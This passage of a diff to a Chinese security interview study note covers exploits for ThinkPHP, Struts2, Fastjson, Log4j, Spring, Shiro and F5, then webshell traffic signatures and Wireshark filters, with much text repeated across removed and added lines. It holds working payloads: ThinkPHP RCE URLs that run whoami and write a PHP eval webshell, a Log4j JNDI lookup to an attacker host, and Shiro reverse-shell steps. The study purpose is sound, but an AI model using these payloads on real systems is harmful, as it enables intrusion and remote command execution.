app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=)**whoami，其中\think\app是类名，后面是恶意方法。**实践与利用：**1、植入一句话木马(写在url中)[**http://192.168.xx.xx/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo**](http://192.168.xx.xx/public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo)** ^<?php @eval($_GET["hack"])?^>>shell.php**2、显示phpinfo信息(写在url中)[**http://192.168.xx.xx/public/index.php?s=index/\think\app/invokefunction&function=phpinfo&varv[0]=100**](http://192.168.xx.xx/public/index.php?s=index/%5Cthink%5Capp/invokefunction&function=phpinfo&varv%5B0%5D=100)****3、POST利用方法一(写在请求正文中)**_method=_construct&filter=system&method=get&server[REQUEST_METHOD]=whoami**4、POST利用方法二(写在请求正文中)**a=system&b=whoami&_method=filter**快速理解：**无**修复建议：**(有时间再补充)**★struts2★**指纹信息：**1、一般st2框架开发的网站，url上会有.action或.do后缀的文件名，比如：**[**http://192.168.xx.xx/integration/editGangster.action**](http://192.168.xx.xx/integration/editGangster.action)****方法1可能不准确，因为spring框架或jboss系统有时候也存在.do结尾的文件名。**2、在相关接口追加actionErrors参数，通过网站页面的回显错误消息来判断。**3、默认情况下，st2框架中存在**[**http://192.168.xx.xx/struts/webconsole.html**](http://192.168.xx.xx/struts/webconsole.html)**这个默认文件。**4、抓包，看包中Content-Type字段的开头是否形如%{#x=['xxx']**方法4仅限于st2-045框架漏洞**漏洞原理：**st2-045**Struts2默认使用org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest类对上传数据进行解析，其在处理Content-Type时如果获得非预期的值的话，将会抛出一个异常。在处理异常的过程中会对错误信息进行OGNL表达式解析。如果错误信息中包含恶意语句，语句将被执行。**【重要】S2-062远程命令执行(cve-2021-31805)**该漏洞由于对CVE-2020-17530的修复不完整造成的，CVE-2020-17530漏洞是由于Struts2 会对某些标签属性(比如id) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 %{x} 且 其中x 的值用户可控时，用户再传入一个 %{payload} 即可造成OGNL表达式执行。在CVE-2021-31805漏洞中，仍然存在部分标签属性会造成攻击者恶意构造的OGNL表达式执行，导致远程代码执行。**原理：开发人员使用%{…} 语法进行强制 OGNL 解析，有一些特殊的TAG属性可以执行二次解析。对不受信任的用户输入使用强制 OGNL 解析可能会导致远程代码执行。**（一般不会问payload，太长了，就是请求体里的%{}里的恶意语句）** 缓解措施： **1、这些 UIBean 元素最终对 name 属性执行第二次 OGNL 评估，因为“value”属性不存在并且它试图填充该属性。因此，通过给所有属性一个空白值 =“”，这将有助于缓解这个问题。（例如：<s:label name="%{skillName}" value="" />**将 org.apache.commons.collection.BeanMap 添加到 Struts2 沙箱的 excludeClasses 列表将排除直接使用它**实践与利用：**点提交按钮然，burpsuite抓包，将Content-Type字段中的内容替换为如下内容**最后响应包里出现指令的结果。**快速理解：**st2-045的漏洞，所有问题都出现在Content-Type字段上。**修复建议：**升级struts2框架至最新版。**★Fastjson★**指纹信息：**1、抓包，看请求包中传入的参数值是否形如json格式，如{"张三":100,"李四":200}。随后将json数据随意修改，看响应包中是否出现fastjson.JSONException字样。**2、正常请求是get请求没有请求体。可以通过构造错误的POST请求，看返回包中是否有fastjson这个字符串。**漏洞原理：**只要我们传入一个json类型数据包含@type，程序在调用JSON.parseObject这个方法处理json对象时，程序就会反序列化生成一个对象。因此，了解了Fastjson处理json的机制(这个机制面试的时候一笔带过即可)，攻击者只需要将@type值设为TemplatesImpl，构造一个恶意类，而这个类还有一个字段是_bytecodes，程序根据_bytecodes生成了一个java实例。问题就在于java实例生成的同时，会自动调用构造函数。那么攻击者只要把恶意代码赋值给_bytecodes字段，恶意代码就会执行。**漏洞原理2：**Fastjson 在对 javaBean 进行序列化的时候会调用它的所有get或者is方法，反序列化的时候会调用所有的 set 方法，如果这个 set 方法中含有些危险的调用链，我们则可以利用这个反序列化过程来执行我们自己的命令。 **fastjson告警，怎么判断是不是攻击事件（恶意，状态码）**实践与利用：**1、新建一个java文件，写入恶意代码。然后编译成class文件。**2、然后将class文件内容进行base64之后赋值给_bytecodes[]。**3、fastjson一旦收到这个json对象，恶意代码将被执行。**快速理解：**有这样一个json对象：**{"@type":TemplatesImpl,"_bytecodes":[恶意语句],"_name":'xxx',"_tfactory":{xxx}};**Fastjson在处理json对象时有问题，只要json对象包含@type:TemplatesImpl，那它就会执行_bytecodes字段里的语句。**修复建议：**对@type字段进行过滤。**★Apache Log4j★**影响范围：**Apache Log4j 2.x<★Apache Shiro★=2.14.1**受影响的应用及组件：Spring-Boot-Strater-log4j2、Apache Solr、Apache Flink、Apache Druid**/*B站链接：**[**https://b23.tv/Ha8UUtG*/**](https://b23.tv/Ha8UUtG*/)****大概的执行逻辑（B站找的）：**黑客在自己的客户端启动一个带有恶意代码的rmi服务，通过服务端的log4j的漏洞，向服务端的jndi context lookup的时候连接自己的rmi服务器，服务端连接rmi服务器执行lookup的时候会通过rmi查询到该地址指向的引用并且本地实例化这个类，所以在类中的构造方法或者静态代码块中写入逻辑，就会在服务端（jndi rmi过程中的客户端）实例化的时候执行到这段逻辑，导致jndi注入。**【重要】漏洞原理：原理分三个模块：${…}表达式、log4j的递归解析机制、Jndi注入**原理一、MessagePatternConverter类的format()方法一旦遇见日志中包含"${"，就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。那么，攻击者只需构造形如"${…}"的表达式，只要表达式符合要求，系统就会执行。**原理二、StrSubstitutor类中提取参数并通过lookup对象进行内容替换，当日志遇到"${"时，Interpolator类以":"号作为分割，将表达式内容分割成两部分。前部分作为prefix(前缀)，后部分作为key(要执行的语句)。然后通过prefix去找对应的lookup对象，通过对应的lookup实例调用其自身的方法，最后将key作为参数带入执行。**原理三、Jndi注入原理就是poc（写好的代码）中${jndi:ldap://192.168.xx.xx/exp}的jndi变量可控。攻击者远程加载一个恶意class文件，当其中的恶意语句被传入到log4j日志文件时，lookup将恶意语句注入到${jndi:ldap://…}中。接着程序通过ldap协议访问192.168.xx.xx这个地址中包含java代码的class文件，从而达成漏洞利用目的。**实践与利用：(问的概率不大，看看就行)**1、在靶机中新建一个Java工程，将apache log4j2的依赖包导入，在src文件夹下创建log4j2.xml文件，作为log4j的配置文件，用来控制输出格式。**2、再在src文件夹下创建hack.java，模拟使用Log4j2框架的可提交输入框，当输入报错时，会将输入框的内容通过logger进行输出，从而将输入框中的恶意语句直接作为参数传递给logger.error函数。**3、在攻击机上创建一个恶意类Log4jRCE.java，这里存放将要通过服务器执行命令的代码。**4、将Log4jRCE.class放在服务器根目录下，在靶机运行IntelliJ里的Hack.java模拟注入攻击提交表单，服务器端使用log4j2输出日志。此时在靶机中成功调用恶意语句。**快速理解：**攻击者向目标发送指定payload，目标对payload进行解析执行，然后通过ldap链接远程服务。当ldap服务收到请求之后，将请求进行重定向到恶意class的地址。最后再下载恶意class并执行其中的代码，从而执行系统命令。**修复建议：**1、添加jvm启动参数-D log4j2.formatMsgNoLookups=true**2、在应用classpath下添加log4j2.component.properties配置文件，文件内容为1中的指令。**3、JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；**4、部署使用第三方防火墙产品进行安全防护。**★Spring Framework★**【重要】Spring Framework远程代码执行漏洞（CVE-2022-22965）**（真问到就说没做过相关复现呢）**影响范围：**1、JDK >= 9且5.3.X < Spring Framework < 5.3.18或5.2.X < Spring Framework < 5.2.20**2、使用受影响的Spring框架或衍生框架。**3、Spring-webmvc或Spring-webflux依赖项。**漏洞的简单描述：（描述时：大概知道一些原理的动机）**Spring Framework是一个开源应用框架，旨在降低应用程序开发的复杂度。它是轻量级、松散耦合的。它具有分层体系结构，允许用户选择组件，同时还为 J2EE 应用程序开发提供了一个有凝聚力的框架。但是在JDK9及以上版本环境中，一些新的版本特性，可以使攻击者绕过一些安全特性，借助某些中间件构造数据包修改敏感文件，达到远程代码执行目的。**（说这个！）Spring框架存在处理流程缺陷，攻击者可远程实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限**实践与利用：**1、在本地用Vulfocus 靶场搭建环境，docker-compose up –d即可。**2、在有漏洞的Sprint框架界面抓包，替换get请求内容如下：**3、将包中内容做如下替换：左边是替换前，右边是替换后。
-**4、最后访问**[**http://192.168.xx.xx:8080//tomcatwar.jsp?pwd=j&cmd=whoami**](http://192.168.xx.xx:8080//tomcatwar.jsp?pwd=j&cmd=whoami)**，可以看到界面上返回了指令结果。**快速理解：**无**修复建议：**1、UWAF防护**2、代码中搜索@InitBinder注解，看方法体内是否调用dataBinder.setDisallowedFields方法。如果有，则在原来的黑名单中添加{" class.module.*"}。**3、请管理员及时更新至最新版本。**★Weblogic★**漏洞原理：**主要源于在coherence.jar存在着用于gadget构造的类（反序列化构造类），并且利用weblogic默认开启的T3协议进行传输和解析，进而导致weblogic服务器将恶意代码反序列化，最后执行攻击语句。**T3 是用于在 WebLogic 服务器和其他类型的Java程序之间传输信息的协议。服务端可以持续追踪监控客户端是否存活(心跳机制)，通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。**实践与利用：**这个框架的实践在面试的时候不必说明，因为大部分关于Weblogic的漏洞都和T3协议有关。**快速理解：**Weblogic在通信过程中传输数据对象，涉及到反序列化操作，如果找到某个类在反序列化过程中能执行的代码，就有可能通过控制这些代码达到远程命令执行的效果。**修复建议：**升级框架版本**【挺重要】F5漏洞CVE-2020-5902（暂时没找到最新的）**成因分析**Apache在处理 /tmui/login.jsp/…;/tmui/locallb/workspace/fileRead.jsp ，会认为处理的是 /tmui/login.jsp 文件，但是 .*.jsp 会进行最大限度的匹配，所以就会将完整的/tmui/login.jsp/…;/tmui/locallb/workspace/fileRead.jsp 转给 Tomcat 处理。关于Apache 对访问权限校验的处理，得去看 /etc/httpd/modules/mod_auth_pam.so ，Tomcat 在处理 /tmui/login.jsp/…;/tmui/locallb/workspace/fileRead.jsp 的时候，会先去除 ; / 之间的字符。**漏洞利用**●利用该漏洞可以以root权限在F5环境中执行命令**●通过调用crul命令可以对文件进行读写操作**●bash命令必须要用alias创建别名，否则会命令执行失败**●将运行脚本写入F5中的文件， 并运行该脚本，理论上可以执行任意shell命令**●使用反弹shell来获取F5的shell**
-## 
-Web工具问题
+
+**★Apache Shiro★**
+
+指纹信息：
+
+请求包中，在Cookie信息中给 rememberMe变量赋任意值，收到返回包的 Set-Cookie 值存在 rememberMe=deleteMe 字段，说明目标使用了Shiro框架。
+
+漏洞原理：
+
+**Shiro-550**Apache Shiro框架提供了RememberMe的功能，用户登录成功后会生成经过加密并编码的cookie，在服务端接收cookie后，Base64解码->AES解密->反序列化。**攻击者只要找到AES加密的密钥，就可以构造恶意对象，对其进行序列化->AES加密->Base64编码，然后将其作为cookie的rememberMe字段发送，对方服务器将rememberMe进行解密并且反序列化，最终造成恶意对象执行，导致反序列化漏洞。
+
+**Shiro-721**(问的概率小，选看)**在Apache Shiro框架的cookie中，带有加密的rememberMe字段存在问题，会受到Padding Oracle攻击。攻击者无需知道RememberMe的加密秘钥，直接使用RememberMe的cookie作为Padding Oracle Attack的前缀，然后把精心制作的恶意语句写入RememberMe字段，从而执行反序列化攻击。
+
+**550和721的区别：550需要AES加密的密钥，721不需要；721是通过Padding Oracle生成加密的攻击代码，而550是通过AES加密生成的攻击代码**
+
+实践与利用：
+
+**Shiro-550**1、首先拿到一个登录框，输入信息，勾选Remember Me后提交。
+
+**2、抓包，查看返回的数据包中set-Cookie字段存在remenberme=deleteme(判断存在漏洞)
+
+**3、使用ysoserial中的监听模块，监听6666端口(为第5步拿到密钥做准备)**
+
+****4、在自己的电脑上，用nc监听7777端口(为第6步拿到shell做准备)****
+
+******5、使用py脚本获取shiro的AES密钥。有了密钥之后，再用py脚本生成payload******
+
+****6、最后，重新登录抓包，把包中的cookie值替换为步骤5中的payload，反弹sehll成功**Shiro-721******
+
+****1、首先登录网站，并从cookie中获取rememberMe字段(该漏洞必须在登录Shiro的前提下才可能利用成功)****
+
+******2、拿到rememberMe cookie后，用它作为Padding Oracle攻击的前缀；****
+
+******3、打开ysoserial工具，加密一条Java序列化Payload，构造恶意rememberMe；****
+
+******4、最后使用构造好的恶意rememberMe重新请求网站，进行反序列化攻击，最终导致远程代码执行。****
+
+******快速理解：****
+
+******Shiro漏洞的本质是处理cookie的流程有问题。**漏洞的关键点就在于找到AES的加密秘钥，AES的密钥是硬编码在代码里。******
+
+********修复建议：**(有时间再补充)******
+
+****★ThinkPHP★**指纹信息：**url上输入**[**http://192.168.xx.xx/ThinkPHP/logo.png**](http://192.168.xx.xx/ThinkPHP/logo.png)**，出现如下图片。该图片也存在于title中。****
+
+******除此之外，“十年磨一剑”也是Thinkphp的重要特征。****
+
+******漏洞原理：****
+
+******程序未对控制器进行过滤，导致攻击者可以通过引入\符号来调用任意类方法。从而使框架存在代码执行漏洞，攻击者可以利用构造的恶意URL执行任意代码。**比如index.php?s=index/\namespace\class/method，在解析url时，会实例化\namespace\class类并执行任意method方法******
+
+****举个例子：[**http://192.168.xx.xx/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=**](http://192.168.xx.xx/public/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=)**whoami，其中\think\app是类名，后面是恶意方法。****
+
+******实践与利用：******
+
+********1、植入一句话木马(写在url中)[**http://192.168.xx.xx/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo**](http://192.168.xx.xx/public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo)** ^<?php @eval($_GET["hack"])?^>>shell.php$**
+
+**$**2、显示phpinfo信息(写在url中)[**http://192.168.xx.xx/public/index.php?s=index/\think\app/invokefunction&function=phpinfo&varv[0]=100**](http://192.168.xx.xx/public/index.php?s=index/%5Cthink%5Capp/invokefunction&function=phpinfo&varv%5B0%5D=100)**$**
+
+**$**3、POST利用方法一(写在请求正文中)**_method=_construct&filter=system&method=get&server[REQUEST_METHOD]=whoami**4、POST利用方法二(写在请求正文中)**a=system&b=whoami&_method=filter**快速理解：**无**修复建议：**(有时间再补充)**★struts2★**指纹信息：**1、一般st2框架开发的网站，url上会有.action或.do后缀的文件名，比如：**[**http://192.168.xx.xx/integration/editGangster.action**](http://192.168.xx.xx/integration/editGangster.action)****方法1可能不准确，因为spring框架或jboss系统有时候也存在.do结尾的文件名。**2、在相关接口追加actionErrors参数，通过网站页面的回显错误消息来判断。**3、默认情况下，st2框架中存在**[**http://192.168.xx.xx/struts/webconsole.html**](http://192.168.xx.xx/struts/webconsole.html)**这个默认文件。$**
+
+**$**4、抓包，看包中Content-Type字段的开头是否形如%{#x=['xxx']**方法4仅限于st2-045框架漏洞**漏洞原理：**st2-045**Struts2默认使用org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest类对上传数据进行解析，其在处理Content-Type时如果获得非预期的值的话，将会抛出一个异常。在处理异常的过程中会对错误信息进行OGNL表达式解析。如果错误信息中包含恶意语句，语句将被执行。**【重要】S2-062远程命令执行(cve-2021-31805)**该漏洞由于对CVE-2020-17530的修复不完整造成的，CVE-2020-17530漏洞是由于Struts2 会对某些标签属性(比如id) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 %{x} 且 其中x 的值用户可控时，用户再传入一个 %{payload} 即可造成OGNL表达式执行。在CVE-2021-31805漏洞中，仍然存在部分标签属性会造成攻击者恶意构造的OGNL表达式执行，导致远程代码执行。**原理：开发人员使用%{…} 语法进行强制 OGNL 解析，有一些特殊的TAG属性可以执行二次解析。对不受信任的用户输入使用强制 OGNL 解析可能会导致远程代码执行。**（一般不会问payload，太长了，就是请求体里的%{}里的恶意语句）$**
+
+**$** 缓解措施： **1、这些 UIBean 元素最终对 name 属性执行第二次 OGNL 评估，因为“value”属性不存在并且它试图填充该属性。因此，通过给所有属性一个空白值 =“”，这将有助于缓解这个问题。（例如：<s:label name="%{skillName}" value="" />**将 org.apache.commons.collection.BeanMap 添加到 Struts2 沙箱的 excludeClasses 列表将排除直接使用它**实践与利用：**点提交按钮然，burpsuite抓包，将Content-Type字段中的内容替换为如下内容**最后响应包里出现指令的结果。$**
+
+**$**快速理解：**st2-045的漏洞，所有问题都出现在Content-Type字段上。**修复建议：**升级struts2框架至最新版。**★Fastjson★**指纹信息：**1、抓包，看请求包中传入的参数值是否形如json格式，如{"张三":100,"李四":200}。随后将json数据随意修改，看响应包中是否出现fastjson.JSONException字样。**2、正常请求是get请求没有请求体。可以通过构造错误的POST请求，看返回包中是否有fastjson这个字符串。**漏洞原理：**只要我们传入一个json类型数据包含@type，程序在调用JSON.parseObject这个方法处理json对象时，程序就会反序列化生成一个对象。因此，了解了Fastjson处理json的机制(这个机制面试的时候一笔带过即可)，攻击者只需要将@type值设为TemplatesImpl，构造一个恶意类，而这个类还有一个字段是_bytecodes，程序根据_bytecodes生成了一个java实例。问题就在于java实例生成的同时，会自动调用构造函数。那么攻击者只要把恶意代码赋值给_bytecodes字段，恶意代码就会执行。**漏洞原理2：**Fastjson 在对 javaBean 进行序列化的时候会调用它的所有get或者is方法，反序列化的时候会调用所有的 set 方法，如果这个 set 方法中含有些危险的调用链，我们则可以利用这个反序列化过程来执行我们自己的命令。 **fastjson告警，怎么判断是不是攻击事件（恶意，状态码）**实践与利用：**1、新建一个java文件，写入恶意代码。然后编译成class文件。**2、然后将class文件内容进行base64之后赋值给_bytecodes[]。**3、fastjson一旦收到这个json对象，恶意代码将被执行。**快速理解：**有这样一个json对象：**{"@type":TemplatesImpl,"_bytecodes":[恶意语句],"_name":'xxx',"_tfactory":{xxx}};**Fastjson在处理json对象时有问题，只要json对象包含@type:TemplatesImpl，那它就会执行_bytecodes字段里的语句。**修复建议：**对@type字段进行过滤。**★Apache Log4j★**影响范围：**Apache Log4j 2.x<★Apache Shiro★=2.14.1**受影响的应用及组件：Spring-Boot-Strater-log4j2、Apache Solr、Apache Flink、Apache Druid**/*B站链接：**[**https://b23.tv/Ha8UUtG*/**](https://b23.tv/Ha8UUtG*/)****大概的执行逻辑（B站找的）：**黑客在自己的客户端启动一个带有恶意代码的rmi服务，通过服务端的log4j的漏洞，向服务端的jndi context lookup的时候连接自己的rmi服务器，服务端连接rmi服务器执行lookup的时候会通过rmi查询到该地址指向的引用并且本地实例化这个类，所以在类中的构造方法或者静态代码块中写入逻辑，就会在服务端（jndi rmi过程中的客户端）实例化的时候执行到这段逻辑，导致jndi注入。**【重要】漏洞原理：原理分三个模块：${…}表达式、log4j的递归解析机制、Jndi注入**原理一、MessagePatternConverter类的format()方法一旦遇见日志中包含"${"，就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。那么，攻击者只需构造形如"${…}"的表达式，只要表达式符合要求，系统就会执行。**原理二、StrSubstitutor类中提取参数并通过lookup对象进行内容替换，当日志遇到"${"时，Interpolator类以":"号作为分割，将表达式内容分割成两部分。前部分作为prefix(前缀)，后部分作为key(要执行的语句)。然后通过prefix去找对应的lookup对象，通过对应的lookup实例调用其自身的方法，最后将key作为参数带入执行。**原理三、Jndi注入原理就是poc（写好的代码）中${jndi:ldap://192.168.xx.xx/exp}的jndi变量可控。攻击者远程加载一个恶意class文件，当其中的恶意语句被传入到log4j日志文件时，lookup将恶意语句注入到${jndi:ldap://…}中。接着程序通过ldap协议访问192.168.xx.xx这个地址中包含java代码的class文件，从而达成漏洞利用目的。**实践与利用：(问的概率不大，看看就行)**1、在靶机中新建一个Java工程，将apache log4j2的依赖包导入，在src文件夹下创建log4j2.xml文件，作为log4j的配置文件，用来控制输出格式。**2、再在src文件夹下创建hack.java，模拟使用Log4j2框架的可提交输入框，当输入报错时，会将输入框的内容通过logger进行输出，从而将输入框中的恶意语句直接作为参数传递给logger.error函数。**3、在攻击机上创建一个恶意类Log4jRCE.java，这里存放将要通过服务器执行命令的代码。**4、将Log4jRCE.class放在服务器根目录下，在靶机运行IntelliJ里的Hack.java模拟注入攻击提交表单，服务器端使用log4j2输出日志。此时在靶机中成功调用恶意语句。**快速理解：**攻击者向目标发送指定payload，目标对payload进行解析执行，然后通过ldap链接远程服务。当ldap服务收到请求之后，将请求进行重定向到恶意class的地址。最后再下载恶意class并执行其中的代码，从而执行系统命令。**修复建议：**1、添加jvm启动参数-D log4j2.formatMsgNoLookups=true**2、在应用classpath下添加log4j2.component.properties配置文件，文件内容为1中的指令。**3、JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；**4、部署使用第三方防火墙产品进行安全防护。**★Spring Framework★**【重要】Spring Framework远程代码执行漏洞（CVE-2022-22965）**（真问到就说没做过相关复现呢）**影响范围：**1、JDK >= 9且5.3.X < Spring Framework < 5.3.18或5.2.X < Spring Framework < 5.2.20**2、使用受影响的Spring框架或衍生框架。**3、Spring-webmvc或Spring-webflux依赖项。**漏洞的简单描述：（描述时：大概知道一些原理的动机）**Spring Framework是一个开源应用框架，旨在降低应用程序开发的复杂度。它是轻量级、松散耦合的。它具有分层体系结构，允许用户选择组件，同时还为 J2EE 应用程序开发提供了一个有凝聚力的框架。但是在JDK9及以上版本环境中，一些新的版本特性，可以使攻击者绕过一些安全特性，借助某些中间件构造数据包修改敏感文件，达到远程代码执行目的。**（说这个！）Spring框架存在处理流程缺陷，攻击者可远程实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限**实践与利用：**1、在本地用Vulfocus 靶场搭建环境，docker-compose up –d即可。**2、在有漏洞的Sprint框架界面抓包，替换get请求内容如下：**3、将包中内容做如下替换：左边是替换前，右边是替换后。
+**4、最后访问**[**http://192.168.xx.xx:8080//tomcatwar.jsp?pwd=j&amp;cmd=whoami**](http://192.168.xx.xx:8080//tomcatwar.jsp?pwd=j&cmd=whoami)**，可以看到界面上返回了指令结果。**快速理解：**无**修复建议：**1、UWAF防护**2、代码中搜索@InitBinder注解，看方法体内是否调用dataBinder.setDisallowedFields方法。如果有，则在原来的黑名单中添加{" class.module.*"}。**3、请管理员及时更新至最新版本。**★Weblogic★**漏洞原理：**主要源于在coherence.jar存在着用于gadget构造的类（反序列化构造类），并且利用weblogic默认开启的T3协议进行传输和解析，进而导致weblogic服务器将恶意代码反序列化，最后执行攻击语句。**T3 是用于在 WebLogic 服务器和其他类型的Java程序之间传输信息的协议。服务端可以持续追踪监控客户端是否存活(心跳机制)，通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。**实践与利用：**这个框架的实践在面试的时候不必说明，因为大部分关于Weblogic的漏洞都和T3协议有关。**快速理解：**Weblogic在通信过程中传输数据对象，涉及到反序列化操作，如果找到某个类在反序列化过程中能执行的代码，就有可能通过控制这些代码达到远程命令执行的效果。**修复建议：**升级框架版本**【挺重要】F5漏洞CVE-2020-5902（暂时没找到最新的）**成因分析**Apache在处理 /tmui/login.jsp/…;/tmui/locallb/workspace/fileRead.jsp ，会认为处理的是 /tmui/login.jsp 文件，但是 .*.jsp 会进行最大限度的匹配，所以就会将完整的/tmui/login.jsp/…;/tmui/locallb/workspace/fileRead.jsp 转给 Tomcat 处理。关于Apache 对访问权限校验的处理，得去看 /etc/httpd/modules/mod_auth_pam.so ，Tomcat 在处理 /tmui/login.jsp/…;/tmui/locallb/workspace/fileRead.jsp 的时候，会先去除 ; / 之间的字符。**漏洞利用**●利用该漏洞可以以root权限在F5环境中执行命令**●通过调用crul命令可以对文件进行读写操作**●bash命令必须要用alias创建别名，否则会命令执行失败**●将运行脚本写入F5中的文件， 并运行该脚本，理论上可以执行任意shell命令**●使用反弹shell来获取F5的shell**
+
+## Web工具问题
+
 **1、菜刀，冰蝎，蚁剑，哥斯拉流量特征
 
 ![](https://cdn.nlark.com/yuque/0/2023/png/23012500/1684121834694-e258db8d-a655-4939-a541-a040720f25cd.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_23%2Ctext_c2h1YWlnZQ%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fresize%2Cw_801%2Climit_0#averageHue=%23fefefe&from=url&id=dDXDG&originHeight=461&originWidth=801&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
+
 ### 中国菜刀
-**早期版本明文传输，后面是 base64 加 **密**特征主要在 body 中，base64-encode **默认参数为 z0，对其进行 base64 解密**之后会发现脚本用于传递 payload 的函 **数，比如 php 的 eval 和 assert，asp 中 **的 execute，后面的版本 body 中部分 **字符被 unicode 编码替换混淆，常见%u **00**
+
+**早期版本明文传输，后面是 base64 加密
+
+特征主要在 body 中，base64-encode **默认参数为 z0，对其进行 base64 解密**之后会发现脚本用于传递 payload 的函 **数，比如 php 的 eval 和 assert，asp 中 **的 execute，后面的版本 body 中部分 **字符被 unicode 编码替换混淆，常见%u **00**
+
 ### 蚁剑
-**Base64 AES加密**php 类常见@ini_set("display_errors"," **0")，asp 类常见 execute，但是会被打 **断拼接，混淆加密后常见_0x......=这种 **形式**
+
+**Base64 AES加密**
+
+php 类常见@ini_set("display_errors"," **0")，asp 类常见 execute，但是会被打 **断拼接，混淆加密后常见_0x......=这种 **形式**
+
 ### 冰蝎
+
 **AES 加密**在建立链接之前会有一个 AES 密钥交 **互过程，body 体中都是 AES 加密后密 **文**冰蝎 1：Content-Type：application/ **octet-stream**冰蝎 2：Content-Length：16**冰蝎 3：Content-Type：application/ **octet-stream**
+
 ### 哥斯拉
-**AES 加密**PHP 连接特征请求都含有"pass**="第一个包第二个包，jsp连接特征与php **请求一样都含有"pass="而且发起连接时服务器返回的 Content-Length 是 0
+
+**AES 加密**
+
+PHP 连接特征请求都含有"pass**="第一个包第二个包，jsp连接特征与php **请求一样都含有"pass="而且发起连接时服务器返回的 Content-Length 是 0
 
 ### Wireshark
-**Wireshark是一个网络封包分析软件，用来截取并分析指定网卡上的流量包。**★Filter编辑框中，过虑规则如果语法无误，框会显绿色，否则是红色**★过滤协议：**直接输入协议名tcp、udp、arp、icmp、http、ftp、dns等等**★过滤IP：**ip.src eq 192.168.1.107 显示来源ip**ip.dst eq 192.168.1.107 显示目标ip**ip.addr eq 192.168.1.107 显示来源或目标ip**★过滤端口：**tcp.port == 80 只要端口的80均显示**tcp.dstport == 80 只显tcp协议的目标端口80**tcp.srcport == 80 只显tcp协议的来源端口80**tcp.port >= 1 and tcp.port <= 80 指定范围过滤**udp.port eq 15000 过滤udp端口**★过滤MAC地址：**eth.dst == A0:00:00:04:C5:84 过滤目标mac**eth.src == A0:00:00:04:C5:84 过滤来源mac**eth.addr == A0:00:00:04:C5:84 显示来源或目标mac**★过滤http模式**http.request.method == "GET" **http.request.uri == "/img/logo-edu.gif"**http contains "GET"**http.request.method == "GET" && http contains "User-Agent:"**http contains "HTTP/1.1 200 OK" && http contains "Content-Type:"**★包长度过滤**udp.length == 26 除了UDP头固定长度8，加上udp下面那块数据包之和**tcp.len >= 7 指的是ip数据包(tcp下面那块数据)，不包括tcp本身**ip.len == 94 除了以太网头固定长度14，其它都算是ip.len，即从ip本身到最后**frame.len == 119 整个数据包长度，从eth开始到最后**----------------------------**
+
+**Wireshark是一个网络封包分析软件，用来截取并分析指定网卡上的流量包。**
+
+★Filter编辑框中，过虑规则如果语法无误，框会显绿色，否则是红色
+
+**★过滤协议：**直接输入协议名tcp、udp、arp、icmp、http、ftp、dns等等**★过滤IP：**ip.src eq 192.168.1.107 显示来源ip**ip.dst eq 192.168.1.107 显示目标ip**ip.addr eq 192.168.1.107 显示来源或目标ip
+
+**★过滤端口：**tcp.port == 80 只要端口的80均显示**tcp.dstport == 80 只显tcp协议的目标端口80**tcp.srcport == 80 只显tcp协议的来源端口80**tcp.port >= 1 and tcp.port <= 80 指定范围过滤**udp.port eq 15000 过滤udp端口
+
+**★过滤MAC地址：**eth.dst == A0:00:00:04:C5:84 过滤目标mac**eth.src == A0:00:00:04:C5:84 过滤来源mac**eth.addr == A0:00:00:04:C5:84 显示来源或目标mac
+
+**★过滤http模式**http.request.method == "GET" **http.request.uri == "/img/logo-edu.gif"**http contains "GET"**http.request.method == "GET" && http contains "User-Agent:"**http contains "HTTP/1.1 200 OK" && http contains "Content-Type:"********
+
+******★包长度过滤**udp.length == 26 除了UDP头固定长度8，加上udp下面那块数据包之和**tcp.len >= 7 指的是ip数据包(tcp下面那块数据)，不包括tcp本身**ip.len == 94 除了以太网头固定长度14，其它都算是ip.len，即从ip本身到最后**frame.len == 119 整个数据包长度，从eth开始到最后**----------------------------**
+
 ### nmap
